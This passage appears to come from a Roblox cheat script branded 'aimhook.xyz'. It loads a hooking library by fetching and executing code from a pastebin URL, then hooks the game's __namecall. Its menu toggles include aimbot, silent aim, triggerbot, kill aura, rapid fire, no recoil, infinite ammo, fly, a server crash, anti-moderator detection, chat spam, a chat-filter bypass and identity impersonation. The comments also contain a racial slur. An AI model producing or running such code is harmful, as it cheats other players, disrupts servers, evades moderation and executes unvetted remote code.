        local mesh = handle:FindFirstChildWhichIsA("SpecialMesh");
        if mesh and mesh.VertexColor == Vector3.new(1, 0, 0.749) then
            mesh.VertexColor = convert_rgb_to_vertex(GetColor().Color);
        end
        if tostring(handle.BrickColor) == "Hot pink" then
            handle.BrickColor = GetColor();
			handle.Color = GetColor().Color;
        end
        local AccessoryWeld;
        for i, v in pairs(handle:GetChildren()) do
            if v.Name == "AccessoryWeld" and v.Part1 ~= nil then
                AccessoryWeld = v;
            end
        end
		if AccessoryWeld then
			AccessoryWeld.Part0 = handle;
			AccessoryWeld.Part1 = character[AccessoryWeld.Part1.Name];
		end
	end
end

function EquipSkin(skin, character)
    if not character then return warn("[EquipSkin] character not found") end;
    if not character:FindFirstChild("Head") then return warn("[EquipSkin] Head not found") end;
    if not character:FindFirstChild("HumanoidRootPart") then return warn("[EquipSkin] HumanoidRootPart not found") end;
	local chrModel = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels:FindFirstChild(skin);
	if chrModel then
        for i, v in pairs(character:GetChildren()) do
            if v:IsA("Accessory") then
                v.Parent = nil;
            end
        end
		for i, v in pairs(character:GetChildren()) do
			if v:IsA("MeshPart") and (v.Name:match("Arm") or v.Name:match("Hand")) then
				v.Transparency = (game.Players.LocalPlayer.Data.Skin.Value:match("Buff") and 1 or 0);
			end
		end
		local shirt = chrModel:FindFirstChildWhichIsA("Shirt");
		local pants = chrModel:FindFirstChildWhichIsA("Pants");
        local face = chrModel.Head:FindFirstChild("face");
        if chrModel:FindFirstChildWhichIsA("BodyColors") then
            if character:FindFirstChildWhichIsA("BodyColors") then
                character:FindFirstChildWhichIsA("BodyColors"):Destroy();
            end
			local Parts = { "HeadColor", "LeftArmColor", "LeftLegColor", "RightArmColor", "RightLegColor", "TorsoColor" }
            local bodycolors = chrModel:FindFirstChildWhichIsA("BodyColors"):Clone();
            bodycolors.Parent = character;
            if character:FindFirstChild("FakeHead") then
                character.FakeHead.Color = bodycolors.HeadColor3;
            end
			for i, v in pairs(Parts) do
				if tostring(bodycolors[v]) == "Hot pink" then
					bodycolors[v] = GetColor();
				end
			end
        end
		if shirt then
			if character:FindFirstChildWhichIsA("Shirt") then
				character:FindFirstChildWhichIsA("Shirt").ShirtTemplate = shirt.ShirtTemplate;
			end
		else
			if character:FindFirstChildWhichIsA("Shirt") then
				character:FindFirstChildWhichIsA("Shirt").ShirtTemplate = "rbxassetid://0";
			end
		end
		if pants then
			if character:FindFirstChildWhichIsA("Pants") then
				character:FindFirstChildWhichIsA("Pants").PantsTemplate = pants.PantsTemplate;
			end
		else
			if character:FindFirstChildWhichIsA("Pants") then
				character:FindFirstChildWhichIsA("Pants").PantsTemplate = "rbxassetid://0";
			end
		end
        if face then
            if character:FindFirstChild("FakeHead") then
                if character.FakeHead:FindFirstChild("face") then
                    character.FakeHead.face.Texture = face.Texture;
                end
            end
            if character.Head:FindFirstChild("face") then
                character.Head.face.Texture = face.Texture;
            end
        end
		for i, v in pairs(chrModel:GetChildren()) do
			if v:IsA("Accessory") then
                weldAccessory(v, character);
            end
		end
    else
        return warn("[equipSkin] Skin not found")
	end
end


local Hooks = loadstring(game:HttpGet("https://pastebin.com/raw/ByQs3S0R"))();
local hkGame = Hooks:new(getrawmetatable(game));

hkGame:Hook("__namecall", function(self, ...) 
    local args = {...};
    if self.Name == "UpdateLoadout" then
        if args[1] and args[1][1] == "UpdateLoadout" then
            local Loadout = args[1][2]
            local unusual = Loadout.Skin:split("_")[2];
            if unusual then
                game.Players.LocalPlayer.Data.Skin.Value = Loadout.Skin:split("_")[1];
                game.Players.LocalPlayer.Data.Skin.Unusual.Value = Loadout.Skin:split("_")[2];
                ApplyUnusual(game:GetService("Players").LocalPlayer, Loadout.Skin:split("_")[2]);
                args[1][2].Skin = Loadout.Skin:split("_")[1];
            else
                game.Players.LocalPlayer.Data.Skin.Value = Loadout.Skin;
                game.Players.LocalPlayer.Data.Skin.Unusual.Value = "";
                if game.Players.LocalPlayer.Character.Head:FindFirstChild("Unusual") then
                    game.Players.LocalPlayer.Character.Head.Unusual:Destroy();
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("UnusualAnimation") then
                    game.Players.LocalPlayer.Character.UnusualAnimation:Destroy();
                end
            end
        end
    end
    if self.Name == "SpawnMe" then
        spawn(function()
            EquipSkin(game:GetService("Players").LocalPlayer.Data.Skin.Value, game:GetService("Players").LocalPlayer.Character);
        end)
    end
    if self.Name == "GetInventory" then
        setupvalue(Core.ViewItems, 1, Loadout);
    end	
    return hkGame:getOriginal("__namecall")(self, unpack(args));
end)

-- Ragdoll Support
workspace.Debris.ChildAdded:Connect(function(child)
    if child.Name == game:GetService("Players").LocalPlayer.Name then
        EquipSkin(game:GetService("Players").LocalPlayer.Data.Skin.Value, child);
    end
end)    
end)

local locker = {
    SwapWith = "Delinquent",
    SwapTo = "MonkyGamer!!",
    RarityColor = Color3.new(0,0,0),
    Shirt = "",
    Pants = ""
}

bSec2:AddTextbox("Swap With", "Delinquent", function(State)
    locker.SwapWith = State
    print(locker.SwapWith)
end)

local ColorToggle = bSec2:AddToggle("Rarity Color", false, function(e)

end)

ColorToggle:AddColorpicker(Color3.fromRGB(0,0,0), function(ztx)
   locker.RarityColor = ztx
end)

local actualClone = {} -- arsenal is shitty, it doesn't allow direct copying, so yeah. Let's get to work.
-- ^^ edit: Not needed, Let's just fucking clone all parts into a non-locked model.

bSec2:AddButton("Create Custom Item", function(st)
    while task.wait() do
        
        local clone -- this is not a needed thing, skids.
        
        if game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.Visible then
            --animation part & Slot Part
            
            
            print("visible")
            if game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.Skins.Item.ViewportFrame:FindFirstChild(locker.SwapWith) then
                print("found")
                game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.Skins.Quality.ImageColor3 = locker.RarityColor
                game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.Skins.TextLabel.Text = "Custom"
                game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.Skins.TextLabel.Text = "Custom"
                --local clone = game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Item.ViewportFrame[locker.SwapWith]:Clone()
                game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.Skins.Item.ViewportFrame[locker.SwapWith]:Destroy()
                print(clone, ' __', 'hooked')
                --actualClone.Locked = false (this aint a actual property, worth a shot tho).
                local anotherClone = game.ReplicatedStorage[locker.SwapWith]:Clone()
                anotherClone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.Skins.Item.ViewportFrame
            else
                print("Not found!")    
            end
            
            game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.LockerMain.Item.ViewportFrame.WorldModel[locker.SwapWith]:Destroy()
            local animClone = game.ReplicatedStorage[locker.SwapWith]:Clone()
            animClone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Slots.LockerMain.Item.ViewportFrame.WorldModel
            local track = animClone.Humanoid:LoadAnimation(HoldingAnimation); -- finish up
            --local ThingThatPlays = animClone.Humanoid:WaitForChild("Animator")
            --ThingThatPlays:LoadAnimation(HoldingAnimation)
            track:Play() -- doesn't do anything yet, no gun model. Soon though. Soon enough.
        end
        
        if game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame.Visible then
            if game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame:FindFirstChild(locker.SwapWith) then
                --actualClone = game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith]:Clone() Nigga shit, we don't do that.
                --actualClone.Parent = game.ReplicatedStorage
                
                print(clone);
                game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].TextLabel.Text = locker.SwapTo
                game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Quality.ImageColor3 = locker.RarityColor
                
                

                
                
                    
                
                if game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Item.ViewportFrame[locker.SwapWith]:FindFirstChild("Shirt") and game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Item.ViewportFrame[locker.SwapWith]:FindFirstChild("Pants") and locker.Shirt ~= "" and locker.Pants ~= "" then
                    game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Item.ViewportFrame[locker.SwapWith].Shirt.ShirtTemplate = locker.Shirt
                    game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Item.ViewportFrame[locker.SwapWith].Pants.PantsTemplate = locker.Pants

                   
                else
                    for _, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Item.ViewportFrame[locker.SwapWith]:GetChildren()) do
                        if v:IsA("Shirt") and locker.Shirt ~= "" then
                            v.ShirtTemplate = locker.Shirt
                        end
                        
                        if v:IsA("Pants") and locker.Pants ~= "" then
                            v.PantsTemplate = locker.Pants
                        end
                    end
                end

            else
                print("Current Skin Not Found: 404");
            end
            
            if game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame.Visible and game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame:FindFirstChild(locker.SwapWith) then
                local actualCloneRepl = Instance.new("Model", game.ReplicatedStorage);
                for ___, vls in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Menew.Locker.Equipping.ScrollingFrame[locker.SwapWith].Item.ViewportFrame[locker.SwapWith]:GetChildren()) do -- too lazy to use next,
                    local cl = vls:Clone()
                    cl.Parent = actualCloneRepl
                end
                actualCloneRepl.Name = (locker.SwapWith)
            
            end
        end
    end
end)

bSec2:AddTextbox("Swap To", "Delinquent with balls!!", function(State)
    locker.SwapTo = State
    print(locker.SwapTo)

end)

bSec2:AddTextbox("Custom ShirtId", "", function(State)
    locker.Shirt = State
    print(locker.SwapTo)

end)

bSec2:AddTextbox("Custom PantsId", "", function(State)
    locker.Pants = State
    print(locker.SwapTo)

end)

bSec:AddButton("Monky", function(x)
    
    
    game.Players.LocalPlayer.Data.Skin.Value = "Monky"
    Loader.RequestAssets({'Monky'}, "ChrModels")

    
    local clone = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.MonkeyHat:Clone()
    clone.Parent = game.Players.LocalPlayer.Character
    
    local clone1 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    clone1.Parent = game.Players.LocalPlayer.Character
    
    game.Players.LocalPlayer.Character.Shirt:Destroy()
    game.Players.LocalPlayer.Character.Pants:Destroy()
    game.Players.LocalPlayer.Character.Cap:Destroy()  --I added this
    game.Players.LocalPlayer.Character.NerdHair:Destroy() --I added this
    
    game.Players.LocalPlayer.Ragdoll.Shirt:Destroy()
    game.Players.LocalPlayer.Ragdoll.Pants:Destroy()
    game.Players.LocalPlayer.Ragdoll.Cap:Destroy()
    game.Players.LocalPlayer.Ragdoll.NerdHair:Destroy()
    
    local clone2 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.Shirt:Clone()
    clone2.Parent = game.Players.LocalPlayer.Character
    
    local clone3 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.Pants:Clone()
    clone3.Parent = game.Players.LocalPlayer.Character
    
    local clone4 = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.Humanoid:Clone()  --I added this and verything under
    clone4.Parent = game.Players.LocalPlayer.Character
    wait(1.0)
    clone4:Destroy()
    
    
    local Ragdollpants = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.Pants:Clone()
    Ragdollpants.Parent = game.Players.LocalPlayer.Ragdoll
    
    local Ragdollshirt = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.Shirt:Clone()
    Ragdollshirt.Parent = game.Players.LocalPlayer.Ragdoll
    
    local RagdollBananaRod = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky["Banana Bod"]:Clone()
    RagdollBananaRod.Parent = game.Players.LocalPlayer.Ragdoll
    
    local RagdollHat = game:GetService("ReplicatedStorage").StreamedAssets.ChrModels.Monky.MonkeyHat:Clone()
    RagdollHat.Parent = game.Players.LocalPlayer.Ragdoll
end)

testSection:AddToggle("SmoothBot", false, function(first)
    configTable.AimBot = first
end)

local vee = testSection:AddToggle("TP To Random Person", false, function(first)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = random_plr().Character.HumanoidRootPart.CFrame

end)

vee:AddKeybind();

testSection:AddToggle("Bot UseSmoothness", true, function(first)
    getgenv().Smoothness = first
end)

testSection:AddToggle("Bot Prediction", true, function(first)
    getgenv().PredictMovement = first
end)

testSection:AddToggle("Bot Team Check", true, function(first)
    getgenv().TeamCheck = first
end)

testSection:AddTextbox("Bot Smoothness", ".08", function(State)
    getgenv().SmoothnessAmount = tonumber(State) 
end)

testSection:AddTextbox("Bot PredictionVelocity", "6.612", function(State)
    getgenv().SmoothnessAmount = tonumber(State) 
end)



testSection:AddToggle("AutoShoot", false, function(first)
    configTable.AutoShoot = first
end)

local t = testSection:AddToggle("AutoShoot2", false, function(first)
    configTable.AutoShoot2 = first
end)

t:AddKeybind()

testSection:AddToggle("TriggerBot", false, function(first)
    configTable.Trigger = first
end)

testSection:AddButton("Rapid Fire", function(v)
    for _, v in pairs(game.ReplicatedStorage.Weapons:GetDescendants()) do
        if v.Name == "FireRate" then
            if true then
                v.Value = 0.02 -- Fast Firerate
            else
                return -- v.Value = 0.8
            end
        end
        
        if v.Name == "Auto" then
            if true then
                v.Value = true;
            else
            end
        end
    end
end)

local aimPart = "Head"

testSection:AddToggle("Silent Aim", false, function(v)
    local notifUI = game:GetService("StarterGui")

    notifUI:SetCore("SendNotification", {
    	Title = "aimhook.xyz";
    	Text = "The script might be laggy! This is a test phase!";
    	Duration = 5;
    })

    configTable.SilentAimar=v;
end)
testSection:AddToggle("Only Target Backtrack",false,function(x)
    configTable.OnlyBT=x;    
end)

testSection:AddToggle("SilentAimV2",false,function(x)
    configTable.S2=x;
    if x then
        watermark.text = 'aimhook.xyz | {fps} | v4.2 | rage'    
    else
        watermark.text = 'aimhook.xyz | {fps} | v4.2 | legit'
    end
end)
testSection:AddToggle("SilentTeamCheck",true,function(x)
    configTable.SCheck=x;    
end)
testSection:AddToggle("SilentIgnoreVisibility",false,function(x)
    configTable.IgnoreVisibility=x;    
end)


testSection:AddToggle("Infinite Ammo", false, function(v)
    if not v then
		game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = ""
	else
		game:GetService("ReplicatedStorage").wkspc.CurrentCurse.Value = "Infinite Ammo"
	end
end)
testSection:AddButton("No Spread", function(v)
    for i,v in next, game.ReplicatedStorage.Weapons:GetChildren() do
			for i,c in next, v:GetChildren() do 
				for i,x in next, getconnections(c.Changed) do
					x:Disable() -- probably not needed
				end
				if c.Name == "Spread" then
					c.Value = 0 -- very gamer
				end
			end
		end
end)


testSection:AddButton("HitBox: Head", function(v)
    aimPart = "Head"
end)
testSection:AddButton("HitBox: UpperTorso", function(v)
    aimPart = "UpperTorso"
end)
testSection:AddButton("HitBox: LeftHand", function(v)
    aimPart = "LeftHand"
end)


testSection:AddButton("No Recoil", function(v)
    for i,v in next, game.ReplicatedStorage.Weapons:GetChildren() do
			for i,c in next, v:GetChildren() do 
				for i,x in next, getconnections(c.Changed) do
					x:Disable() -- probably not needed
				end
				if c.Name == "RecoilControl" then
					c.Value = 0 -- very gamer
				end
			end
		end
end)





testSection:AddDropdown("LocalAimPart", {"Head", "UpperTorso", "LowerTorso"}, "Head",false, function(dropdown)
    --configTable.LocalAimPart = dropdown
    aimPart = dropdown
end)
testSection:AddDropdown("resolver", {"pitch","rotations"}, {},true, function(dropdown)
    --configTable.LocalAimPart = dropdown
    configTable.resolveparts=dropdown
    if not arsonfuncs:IsEmpty(dropdown) then
        for _, v in pairs(game.Players:GetPlayers()) do
            if v.TeamColor ~= game.Players.LocalPlayer.TeamColor and v.Character then
                NotifyLib.prompt("Resolver", 'Resolved '..v.Name .. " in "..math.floor(tick()), 5)    
            end
        end
    end
end)

testSection:AddButton("Crash Server",function(x)
    arsonfuncs:Crash()    
end)

--local ColorToggle = testSection:AddToggle("ColorPicker w/Toggle", false, function(e)
--
--end)

--ColorToggle:AddColorpicker(Color3.fromRGB(75, 0,130), function(ztx)
   
--end)

local sound="https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/vanish.mp3?raw=true"
local _cool = false

vSec9:AddDropdown("song library", {"Vanish", "Dreamland 2"}, "Vanish",false, function(dropdown)
   
    
    if dropdown=="Vanish" then
        sound="https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/vanish.mp3?raw=true"
        writefile("m.mp3", game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/vanish.mp3?raw=true"))
        game.Players.LocalPlayer.PlayerGui.G.LocalScript.Player.SoundId=getsynasset("m.mp3");

    end
    print(dropdown)
    if dropdown=="Dreamland 2" then
        sound="https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/d2.mp3?raw=true"
        writefile("m.mp3", game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/d2.mp3?raw=true"))
        game.Players.LocalPlayer.PlayerGui.G.LocalScript.Player.SoundId=getsynasset("m.mp3");

    end
end)
    --configTable.LocalAimPart = dropdown

--vSec9:AddTextbox("URL To Play", "Enter URL", function(State)
--    sound=State
--end)

vSec9:AddButton("Play", function(x)
    --if isfile("m.mp3") then
    --    delfile("m.mp3")    
    --end
    
    writefile("m.mp3", game:HttpGet(sound))
    game.Players.LocalPlayer.PlayerGui.G.LocalScript.Player.SoundId=getsynasset("m.mp3");
    --game.Players.LocalPlayer.PlayerGui.G.LocalScript.Player.Looped=true
   -- workspace.Player.Looped = true
    game.Players.LocalPlayer.PlayerGui.G.LocalScript.Player.Volume=.8
    game.Players.LocalPlayer.PlayerGui.G.LocalScript.Player:Play()
end)

vSec9:AddButton("Stop", function(x)
    game.Players.LocalPlayer.PlayerGui.G.LocalScript.Player:Stop()    
end)

--local hitsound="Ara Ara"

vSec5:AddTextbox("FOV Changer", tostring(game.Players.LocalPlayer.Settings.FOV.Value), function(state)
    game.Players.LocalPlayer.Settings.FOV.Value=state
end)

local impersonation={UID=1,Name="Roblox",Level=math.huge}

vSec6:AddTextbox("userid", "enter user id", function(state)
    impersonation.UID=tonumber(state)
end)

vSec6:AddTextbox("username", "enter username", function(state)
    impersonation.Name=state;
end)

vSec6:AddTextbox("level", "enter level", function(state)
    impersonation.Level=state;
end)

vSec6:AddButton("Impersonate",function(x)
    game:GetService("Players").LocalPlayer.Settings.ShowDisplayNames.Value=true
    game.Players.LocalPlayer.DisplayName=impersonation.Name;
    game.Players.LocalPlayer.UserId=impersonation.UID;
    game:GetService("Players").LocalPlayer.PlayerGui.Menew.Main.PlrName.Text = impersonation.Name .. " - " .. "Level: "..tostring(impersonation.Level)
end)

local ToggleBind = vSec:AddToggle("Fly [T]", false, function(e)
    configTable.Fly = e
end)
local ToggleBin34643634666666666664d = vSec:AddToggle("Autofarm Hearts", false, function(e)
    configTable.Farmhearts = e
end)
vSec:AddDropdown("Auto Farm Type", {"tp", "force"}, "force",false, function(x)
    configTable.ftype=x;
end)
local ToggleBin45654654654d = vSec:AddToggle("AntiMod", false, function(e)
    configTable.Mods = e
end)
local ToggleBin45654654654d = vSec:AddToggle("Notify Godmode Users", false, function(e)
    configTable.GodNotify=e;
end)
vSec:AddToggle("BunnyHop [SPACE]", false, function(e)
    configTable.BunnyHop = e
end)
vSec:AddDropdown("Bunny Hop Method", {"Velocity", "Humanoid"}, "Humanoid",false, function(dropdown)
    configTable.BHopMethod = tostring(dropdown);
    print(configTable.BHopMethod);
end)
vSec:AddSlider("Bunny Hop Speed", 1, 20, 100, 1, function(State)
    configTable.BHopSpeed=State;
end)
vSec:AddSlider("Gravity", 0, 56, 100, 1, function(State)
    game.ReplicatedStorage.CurrentGrav.Value=State
end)


charMods:AddToggle("Upside Down Character", false, function(c)
    configTable.UpsideDown=c;
end)

local ToggleBindz = vSec:AddToggle("Chat Spammer [chat first]", false, function(e)
    configTable.Spammer = e
end)


local erghertgert = vSec:AddToggle("No Chat Filter", false, function(e)
    configTable.NoFilter = e
end)

local ToggleBindz = vSec:AddToggle("Death Say [chat first]", false, function(e)
    configTable.DeathSay = e
end)



vSec:AddTextbox("Chat Spam Text", "aimhook is the best confirmable", function(State)
    configTable.ChatContext = State
    print(configTable.ChatContext)
end)

local ToggleBinde = aaSec:AddToggle("Anti Aim", false, function(e)
    configTable.AntiAim = e
end)

aaSec:AddDropdown("Anti Aim Type", {"Mental", "Down", "Up", "Random"}, "Down",false, function(dropdown)
    configTable.AA_METHOD = tostring(dropdown);
    print(configTable.AA_METHOD);
end)


local ToggleBinde = aaSec:AddToggle("Use Spin", false, function(e)
    configTable.AASpin = e
end)
local ToggleBinde = aaSec:AddToggle("Remove Accessories", false, function(e)
    configTable.Racc = e;
end)


local ToggleBinde = aaSec:AddToggle("Use Custom Rotation", false, function(e)
    configTable.UseCustomRotation = e
end)

aaSec:AddSlider("Spin Speed", 1, 120, 480, 1, function(State)
    configTable.SpinSpeed=State
    
end)

aaSec:AddSlider("Rotation Y", 0, 5, 12, 1, function(State)
    configTable.RotationY=State
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Spawned") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.Rotation = Vector3.new(0,math.rad(configTable.RotationY),0)    
    end
end)

local ToggleBinde57322 = vSec:AddToggle("Hitsounds", false, function(e)
    configTable.Hitsounds = e
end)

local ToggleBinde458923932052 = vSec:AddToggle("Silence Weapons", false, function(e)
    if e then
        game.SoundService.WeaponDischarge.Volume=0;    
    else
        game.SoundService.WeaponDischarge.Volume=extVol;    

    end
end)

vSec:AddDropdown("sound", {"aimhook", "skeet.cc", "neverlose", "rust", "bag", "sit","reminder","uwu","zing","crowbar","ara ara","burp","mario","laugh","huh"}, "skeet.cc",false, function(dropdown)
    configTable.Hitsound=tostring(dropdown);
    print(configTable.configTable.Hitsound);
end)


local ToggleBindv = vSec:AddToggle("CFrame Speed", false, function(e)
    configTable.Speed = e
end)



task.spawn(function()
    while task.wait() do
        --SAVETABLE.SKIN=game.Players.LocalPlayer.Data.Skin.Value;
    if configTable.Speed and _G.Running == true and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.HumanoidRootPart then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame +
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.45 -- im just testing
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame +
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.45 -- im just testing
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame +
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.45 -- im just testing
    end
    
if game.ReplicatedStorage:FindFirstChild('Blank') then
    game.ReplicatedStorage.Blank:Destroy()    
end

for _, vls in pairs(workspace.Camera:GetChildren()) do
        if vls and vls:IsA("Model") and configTable.CS_SLEEVES then
            for __, v in pairs(vls:GetChildren()) do
                if v:IsA("Model") then
                    for i, vv in pairs(v:GetChildren()) do
                        if vv.Name == "Left Arm" then
                            if configTable.RSleeve then
                                if vv:FindFirstChild("Left_Sleeve") then
                                    vv.Left_Sleeve:Destroy()    
                                end
                                if vv:FindFirstChild("Right_Sleeve") then
                                    vv.Right_Sleeve:Destroy()    
                                end
                            end
                            if vv:FindFirstChild("Left_Sleeve") and vv.Left_Sleeve:FindFirstChild("teamoverlay")then -- means they have a sleeve, very good
                                vv["Left_Sleeve"].Mesh.TextureId = __config.Texture -- any texture works
                                vv["Left_Sleeve"].teamoverlay.Texture =  __config.Texture -- any texture works
                                vv["Left_Sleeve"].teamoverlay.Color3 =  __config.Color -- any texture works

                            end
                            
                             if vv:FindFirstChild("L") then -- means they have a sleeve, very good
                                vv["L"].Mesh.TextureId = __config.Texture -- any texture works

                            end
                        end
                                
                        if vv.Name == "Right Arm" then 
                             if vv:FindFirstChild("Right_Sleeve") and vv.Right_Sleeve:FindFirstChild("teamoverlay") then -- means they have a sleeve, very good
                                vv["Right_Sleeve"].Mesh.TextureId = __config.Texture -- any texture works
                                vv["Right_Sleeve"].teamoverlay.Texture =  __config.Texture -- any texture works
                                vv["Right_Sleeve"].teamoverlay.Color3 =  __config.Color -- any texture works

                             end
                        
                             if vv:FindFirstChild("R") then -- means they have a sleeve, very good
                                vv["R"].Mesh.TextureId = __config.Texture -- any texture works

                            end
                        end
                    end    
                end
            end
        end
end
shared.Settings=configTable

if configTable.Farmhearts then
    for _, v in next, workspace.Debris:GetChildren() do 
        if v.Name == 'Heart'then
            if configTable.ftype == 'tp'then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
            else
                local savedPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
                task.wait(.000000000000000000000000000000000001)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedPos
            end
        end
    end    
end

if configTable.Racc then
    if game.Players.LocalPlayer.Character then
                for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren())do
                    if string.find(v.ClassName:lower(),"accessory")and v:FindFirstChild("Handle") then v.Handle:Destroy() end
                end
            end    
end

if configTable.GodNotify then
    for _, v in next, game.Players:GetPlayers() do 
        if v.Character and v.NRPBS.Health.Value > 0 and not table.find(GoddedUsers, v.Name) then
            
            
            if not v.Character:FindFirstChild("LowerTorso") or not v.Character.LowerTorso:FindFirstChild("Root") then
                NotifyLib.prompt('Godmode Detected', v.Name .. " has been caught lacking bitches", 5)
                if not table.find(GoddedUsers, v.Name) then -- sometimes buggy so double check !
                    table.insert(GoddedUsers, v.Name) -- so we dont check for that person again
                end
            end
            
            if not v.Character:FindFirstChild("Humanoid") or not v.Character.Humanoid:FindFirstChild("HeadScale") then
                NotifyLib.prompt('Godmode Detected', v.Name .. " has been caught lacking bitches", 5)
                print(v.Name .. " went into godmode!!")
                if not table.find(GoddedUsers, v.Name) then -- sometimes buggy so double check !
                    table.insert(GoddedUsers, v.Name) -- so we dont check for that person again
                end
            end
        end
    end    
end

if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Spawned") then
    if configTable.AASpin then
        game.Players.LocalPlayer.Character.Humanoid.AutoRotate = false
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(configTable.SpinSpeed), 0)    
    end
    
    
    
end




if not arsonfuncs:IsEmpty(configTable.resolveparts) then
    for _i, v in pairs(game.Players:GetPlayers()) do 
        if table.find(configTable.resolveparts, 'pitch') then
            if v.Character and v.Character:FindFirstChild("Spawned") and v.TeamColor ~= game.Players.LocalPlayer.TeamColor then
                v.Character.UpperTorso.Waist.C0 = CFrame.new(Vector3.new(0,0.6,0))
            	v.Character.Head.CFrame = CFrame.new(v.Character.Head.Position)  
            end
        end
        
        if table.find(configTable.resolveparts, 'rotations') then
            if v.Character and v.Character:FindFirstChild("Spawned") and v.TeamColor ~= game.Players.LocalPlayer.TeamColor then
                v.Character.Humanoid.MaxSlopeAngle = 0 or 0
            end   
        end
    end
end

if configTable.NoArms then
    game.Players.LocalPlayer.Data.Skin.Value = "Nonexisty";    
end
if configTable.KillAura then
    for i,v in pairs(game.Players:GetPlayers()) do
            if v and v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Head") and v.Character:FindFirstChild("Spawned") and v.TeamColor ~= game.Players.LocalPlayer.TeamColor then    
                local Distance = (game.Players.LocalPlayer.Character.PrimaryPart.Position - v.Character.PrimaryPart.Position).magnitude 
                if Distance <= 12 then
                    for i=0,5 do -- best possible damage :)
                        arsonfuncs:KillPlayer(v)
                    end
                end
            end
        end
    end
end











if configTable.RSleeve then
    for _, vls in pairs(workspace.Camera:GetChildren()) do
        if vls and vls:IsA("Model") then
            for __, v in pairs(vls:GetChildren()) do
                if v:IsA("Model") then
                    for i, vv in pairs(v:GetChildren()) do
                        if vv.Name == "Left Arm" then
                            if configTable.RSleeve then
                                if vv:FindFirstChild("Left_Sleeve") then
                                    vv.Left_Sleeve:Destroy()    
                                end
                                if vv:FindFirstChild("Right_Sleeve") then
                                    vv.Right_Sleeve:Destroy()    
                                end
                            end
                            
                        end
                                
                        if vv.Name == "Right Arm" then 
                             if configTable.RSleeve then
                                if vv:FindFirstChild("Left_Sleeve") then
                                    vv.Left_Sleeve:Destroy()    
                                end
                                if vv:FindFirstChild("Right_Sleeve") then
                                    vv.Right_Sleeve:Destroy()    
                                end
                            end
                        end
                    end    
                end
            end
        end
end
end



if configTable.LArms then
    for _, vls in pairs(workspace.Camera:GetChildren()) do
        if vls and vls:IsA("Model") then
            for __, v in pairs(vls:GetChildren()) do
                if v:IsA("Model") then
